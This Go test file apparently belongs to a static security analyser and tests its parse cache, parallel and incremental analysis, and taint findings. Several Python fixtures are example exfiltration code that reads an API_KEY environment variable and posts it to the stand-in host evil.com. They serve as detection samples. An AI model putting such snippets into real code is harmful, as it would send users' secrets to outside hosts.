package ir

import (
	"fmt"
	"testing"
)

func TestParseCacheBasic(t *testing.T) {
	cache := NewParseCache()

	code := `import os
def hello():
    os.system("echo hello")
`

	file, err := cache.GetOrParse("test.py", code, "python")
	if err != nil {
		t.Fatalf("Parse error: %v", err)
	}

	if file.Path != "test.py" {
		t.Errorf("expected path test.py, got %s", file.Path)
	}

	// 第二次应该命中缓存
	file2, err := cache.GetOrParse("test.py", code, "python")
	if err != nil {
		t.Fatalf("Cache hit error: %v", err)
	}

	if file2.Path != file.Path {
		t.Error("cache should return same file")
	}

	fmt.Printf("=== 解析缓存测试 ===\n")
	fmt.Printf("Cache size: %d\n", cache.Size())

	if cache.Size() != 1 {
		t.Errorf("expected cache size 1, got %d", cache.Size())
	}
}

func TestParseCacheInvalidation(t *testing.T) {
	cache := NewParseCache()

	code1 := `def hello(): pass`
	code2 := `def world(): pass`

	cache.GetOrParse("test.py", code1, "python")
	if cache.Size() != 1 {
		t.Error("cache should have 1 entry")
	}

	// 内容不同，应该重新解析
	cache.GetOrParse("test.py", code2, "python")
	if cache.Size() != 1 {
		t.Error("cache should still have 1 entry (replaced)")
	}

	// 手动失效
	cache.Invalidate("test.py")
	if cache.Size() != 0 {
		t.Error("cache should be empty after invalidation")
	}
}

func TestParseCacheClear(t *testing.T) {
	cache := NewParseCache()

	cache.GetOrParse("a.py", "def a(): pass", "python")
	cache.GetOrParse("b.py", "def b(): pass", "python")

	if cache.Size() != 2 {
		t.Errorf("expected 2 entries, got %d", cache.Size())
	}

	cache.Clear()
	if cache.Size() != 0 {
		t.Error("cache should be empty after clear")
	}
}

func TestParallelAnalyzer(t *testing.T) {
	files := []File{
		*mustParse("a.py", `import os
def get_secret():
    return os.getenv("API_KEY")
`),
		*mustParse("b.py", `import requests
def send_data(data):
    requests.post("https://evil.com", data=data)
`),
	}

	analyzer := NewParallelAnalyzer(2)
	result := analyzer.AnalyzeParallel(files)

	fmt.Printf("=== 并行分析测试 ===\n")
	fmt.Printf("Files: %d\n", len(result.Files))
	fmt.Printf("TaintFindings: %d\n", len(result.TaintFindings))
	fmt.Printf("ChainResults: %d\n", len(result.ChainResults))
	fmt.Printf("SimilarityMatches: %d\n", len(result.SimilarityMatches))
	fmt.Printf("CallGraphStats: %s\n", result.CallGraphStats.String())
}

func TestParseAndAnalyze(t *testing.T) {
	analyzer := NewParallelAnalyzer(2)

	inputs := []FileInput{
		{Path: "attack.py", Content: `import os
import requests
def exfiltrate():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`, Language: "python"},
	}

	result := analyzer.ParseAndAnalyze(inputs)

	fmt.Printf("=== ParseAndAnalyze 测试 ===\n")
	fmt.Printf("Files: %d\n", len(result.Files))
	fmt.Printf("TaintFindings: %d\n", len(result.TaintFindings))
	fmt.Printf("ChainResults: %d\n", len(result.ChainResults))
	fmt.Printf("SimilarityMatches: %d\n", len(result.SimilarityMatches))

	if len(result.Files) == 0 {
		t.Error("should parse at least one file")
	}
}

func TestParallelVsSequential(t *testing.T) {
	// 创建多个文件
	code := `import os
import requests
def attack():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
    os.system("cleanup")
`

	var files []File
	for i := 0; i < 10; i++ {
		file := mustParse(fmt.Sprintf("file_%d.py", i), code)
		if file != nil {
			files = append(files, *file)
		}
	}

	// 串行分析
	analyzer := NewParallelAnalyzer(1)
	result := analyzer.AnalyzeParallel(files)

	fmt.Printf("=== 串行 vs 并行测试 ===\n")
	fmt.Printf("Files: %d\n", len(files))
	fmt.Printf("TaintFindings: %d\n", len(result.TaintFindings))
	fmt.Printf("ChainResults: %d\n", len(result.ChainResults))

	// 并行分析
	analyzer2 := NewParallelAnalyzer(4)
	result2 := analyzer2.AnalyzeParallel(files)

	fmt.Printf("Parallel TaintFindings: %d\n", len(result2.TaintFindings))
	fmt.Printf("Parallel ChainResults: %d\n", len(result2.ChainResults))

	// 结果应该一致
	if len(result.TaintFindings) != len(result2.TaintFindings) {
		t.Errorf("taint findings mismatch: sequential=%d parallel=%d", len(result.TaintFindings), len(result2.TaintFindings))
	}
}

func mustParse(path, code string) *File {
	lang := detectLangFromPath(path)
	parser, ok := GetParser(lang)
	if !ok {
		return nil
	}
	file, err := parser.Parse(path, code)
	if err != nil {
		return nil
	}
	return file
}

func TestIncrementalAnalyzerBasic(t *testing.T) {
	analyzer := NewIncrementalAnalyzer()

	files := []FileInput{
		{Path: "a.py", Content: "import os\ndef get():\n    return os.getenv('KEY')\n", Language: "python"},
		{Path: "b.py", Content: "import requests\ndef send(d):\n    requests.post('http://e.com', data=d)\n", Language: "python"},
	}

	// 第一次分析（全量）
	result1 := analyzer.AnalyzeIncremental(files)
	fmt.Printf("=== 第一次分析 ===\n")
	fmt.Printf("Files: %d, Taint: %d, Chain: %d\n", len(result1.Files), len(result1.TaintFindings), len(result1.ChainResults))

	stats := analyzer.CacheStats()
	fmt.Printf("Cache: %s\n", stats.String())

	if len(result1.Files) != 2 {
		t.Errorf("expected 2 files, got %d", len(result1.Files))
	}
}

func TestIncrementalAnalyzerDetectChanges(t *testing.T) {
	analyzer := NewIncrementalAnalyzer()

	files1 := []FileInput{
		{Path: "a.py", Content: "print('hello')\n", Language: "python"},
		{Path: "b.py", Content: "print('world')\n", Language: "python"},
	}

	// 第一次：全部是 added
	changes1 := analyzer.DetectChanges(files1)
	for _, c := range changes1 {
		if c.Status != ChangeAdded {
			t.Errorf("expected ChangeAdded for %s, got %s", c.Path, c.Status)
		}
	}

	// 更新指纹
	for _, f := range files1 {
		analyzer.fileFingerprints[f.Path] = contentHash(f.Path, f.Content)
	}

	// 第二次：全部是 unchanged
	changes2 := analyzer.DetectChanges(files1)
	for _, c := range changes2 {
		if c.Status != ChangeUnchanged {
			t.Errorf("expected ChangeUnchanged for %s, got %s", c.Path, c.Status)
		}
	}

	// 修改一个文件
	files2 := []FileInput{
		{Path: "a.py", Content: "print('modified')\n", Language: "python"},
		{Path: "b.py", Content: "print('world')\n", Language: "python"},
	}
	changes3 := analyzer.DetectChanges(files2)
	modifiedCount := 0
	for _, c := range changes3 {
		if c.Status == ChangeModified {
			modifiedCount++
		}
	}
	if modifiedCount != 1 {
		t.Errorf("expected 1 modified file, got %d", modifiedCount)
	}
}

func TestIncrementalAnalyzerDeleteDetection(t *testing.T) {
	analyzer := NewIncrementalAnalyzer()

	files1 := []FileInput{
		{Path: "a.py", Content: "print('a')\n", Language: "python"},
		{Path: "b.py", Content: "print('b')\n", Language: "python"},
	}

	// 初始化指纹
	for _, f := range files1 {
		analyzer.fileFingerprints[f.Path] = contentHash(f.Path, f.Content)
	}

	// 删除一个文件
	files2 := []FileInput{
		{Path: "a.py", Content: "print('a')\n", Language: "python"},
	}

	changes := analyzer.DetectChanges(files2)
	deletedCount := 0
	for _, c := range changes {
		if c.Status == ChangeDeleted {
			deletedCount++
		}
	}

	fmt.Printf("=== 删除检测测试 ===\n")
	fmt.Printf("Deleted: %d\n", deletedCount)

	if deletedCount != 1 {
		t.Errorf("expected 1 deleted file, got %d", deletedCount)
	}
}

func TestIncrementalAnalyzerPerformance(t *testing.T) {
	analyzer := NewIncrementalAnalyzer()

	// 创建 20 个文件
	code := `import os
import requests
def attack():
    secret = os.getenv("API_KEY")
    requests.post("https://evil.com", json={"key": secret})
`

	var files []FileInput
	for i := 0; i < 20; i++ {
		files = append(files, FileInput{
			Path:     fmt.Sprintf("file_%d.py", i),
			Content:  code,
			Language: "python",
		})
	}

	// 第一次：全量
	result1 := analyzer.AnalyzeIncremental(files)
	fmt.Printf("=== 性能测试 ===\n")
	fmt.Printf("Round 1: Files=%d, Taint=%d\n", len(result1.Files), len(result1.TaintFindings))

	// 第二次：只改 1 个文件
	files[0].Content = `import os
def safe():
    print("hello")
`
	result2 := analyzer.AnalyzeIncremental(files)
	fmt.Printf("Round 2: Files=%d, Taint=%d\n", len(result2.Files), len(result2.TaintFindings))

	stats := analyzer.CacheStats()
	fmt.Printf("Cache: %s\n", stats.String())
}
